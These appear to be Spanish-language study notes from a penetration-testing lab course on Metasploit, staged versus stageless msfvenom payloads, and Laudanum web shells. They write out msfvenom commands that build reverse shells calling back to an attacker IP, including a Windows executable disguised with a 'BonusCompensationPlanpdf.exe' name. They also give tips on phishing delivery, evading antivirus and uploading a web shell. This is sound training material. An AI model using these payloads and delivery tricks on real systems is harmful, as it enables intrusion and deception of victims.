> Metasploit es un framework de código abierto para pruebas de penetración creado por Rapid7, diseñado para ayudar a los profesionales de la seguridad a simular ataques contra sistemas informáticos, redes y aplicaciones. Proporciona un conjunto completo de herramientas y módulos que pueden usarse para identificar vulnerabilidades, explotarlas y evaluar la seguridad de los sistemas objetivo. Metasploit está escrito en Ruby y ofrece una arquitectura modular, lo que permite a los usuarios personalizar y ampliar sus capacidades.

A continuación, se proporciona un cheatsheet de la herramienta

![[Pasted image 20250412213121.png]]

### MSFVenom

Debemos tener en cuenta que usar ataques automatizados con Metasploit requiere acceso a la máquina vulnerable a través de la red. Para ejecutar un exploit, enviar el payload y obtener una shell, primero necesitamos comunicarnos con el sistema. Esto suele ser posible si estamos en la misma red o tenemos una ruta hacia ella. Sin embargo, a veces no tendremos acceso directo a la red del objetivo. En esos casos, tendremos que ingeniárnoslas para que el payload sea entregado y ejecutado, por ejemplo, usando **MSFvenom** para crear un payload que se pueda enviar por correo electrónico o mediante técnicas de ingeniería social.

En resumen, **Msfvenom** es una herramienta para crear payloads efectivos

##### Practicando con la herramienta

Con el comando `msfvenom -l` podemos listar los payloads disponibles. Podemos ver que siempre comienzan con el sistema operativo para el que trabaja el payload, además del tipo de payload que es (Stage o Stageless). Existen diferencias entre ellos:

**Payloads Staged**

Los **payloads escalonados (staged payloads)** permiten enviar nuestra carga útil en partes, como si estuviéramos “preparando el escenario” para algo más avanzado. Por ejemplo, el payload `linux/x86/shell/reverse_tcp` primero envía una pequeña parte (el _stager_) que se ejecuta en el sistema objetivo y luego se conecta de vuelta a la máquina atacante para descargar el resto del código (el _stage_) y así establecer una shell reversa.

Si usamos Metasploit para ejecutar este tipo de payload, debemos configurar correctamente la IP y el puerto del atacante para que el _listener_ (escucha) pueda capturar la conexión. Es importante tener en cuenta que cada etapa ocupa espacio en memoria, lo que puede limitar el tamaño del payload. Además, el comportamiento puede variar según el payload específico que se utilice.

**Payloads Stageless**

Los **payloads sin etapas (stageless)** se envían completos, sin necesidad de una fase previa que prepare el entorno. Por ejemplo, el payload `linux/zarch/meterpreter_reverse_tcp` se transmite de una sola vez mediante un módulo de explotación en Metasploit.

Esto es útil en entornos con poco ancho de banda o alta latencia, donde los payloads escalonados podrían causar sesiones inestables. Además, los stageless pueden ser más eficaces para evadir detección, ya que generan menos tráfico en la red, especialmente si se entregan mediante técnicas de ingeniería social.

##### Construyendo un payload stageless

Por ejemplo, vamos a constuir un payload stageless haciendo uso de una reverse shell en Linux x64, es decir, basándonos en dicha arquitectura. Hemos escogido `linux/x64/shell_reverse_tcp` (lo podemos obtener listando los payloads disponibles). 

```shell-session
amr251@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Es bastante intuitivo, pero aun así, vamos a explicar los flags:
- `LHOST=10.10.14.113 LPORT=443`: Al ejecutarse, se conectará al host y puerto especificados
- `-f elf`: El formato en el que se generará el payload
- `> createbackup.elf`: El output

##### Ejecutando un payload stageless

En este punto, hemos creado el payload en nuestra máquina de atacante, pero hay que enviárselo a la máquina víctima de alguna manera. Hay muchas formas de hacer esto:

- Enviarlo como **archivo adjunto por email**.
- Colocarlo en un **enlace de descarga** en un sitio web.
- Usarlo junto con un **módulo de explotación de Metasploit** (si ya estamos dentro de la red interna).
- Cargarlo en una **unidad USB** durante un pentest físico.

Una vez que el archivo está en la máquina, también será necesario **ejecutarlo**. Por ejemplo: si el equipo objetivo es una máquina Ubuntu que un administrador usa para tareas de red, como acceder a routers o switches, y además lo utiliza de forma descuidada como si fuera un PC personal, podríamos engañarlo para que haga clic en el archivo que le enviamos por correo.

##### Creando un payload stageless para Windows

```shell-session
amr251@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

La modificación está en que al ser para Windows, el payload debe ser para la extensión `.exe`. Necesitamos ser creativos, ya que muy seguramente el sistema antivirus detecte el .exe como un virus y lo borre. Si AV está dehabilitado se podría ejecutar en la máquina víctima y sencillamente tendríamos la reverse shell hecha.

## Laudanum

Laudanum es un repositorio de archivos listos para ser utilizados para inyectar en una víctima y recibir acceso de vuelta a través de un shell inverso, ejecutar comandos en el host de la víctima directamente desde el navegador, y mucho más. El repositorio incluye archivos inyectables para muchos lenguajes de aplicaciones web diferentes, incluyendo asp, aspx, jsp, php y más.

Los archivos pueden encontrarse en `/usr/share/laudanum`. Ahora que entendemos qué es Laudanum y cómo funciona, echemos un vistazo a una aplicación web que hemos encontrado en nuestro entorno de laboratorio y veamos si podemos ejecutar una shell web. Si desea seguir con esta demostración, tendrá que añadir una entrada en su archivo /etc/hosts en su máquina virtual de ataque o dentro de Pwnbox para el host que estamos atacando. Esa entrada debe decir: `<ip objetivo> status.inlanefreight.local`

```shell-session
amr251@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Añade tu dirección IP a la variable allowedIps en la línea 59. Puede ser prudente eliminar el arte ASCII y los comentarios del archivo. Estos elementos en un payload son a menudo firmados y pueden alertar a los defensores/AV de lo que estás haciendo.

![[Pasted image 20250413222241.png]]

Ahora tendremos que buscar la forma de subir el archivo. Una vez lo hemos logrado, podremos usar la shell de Laudanum para usar comandos en el host. Otra herramienta que está muy bien para esto es la Antak de Nishang. 

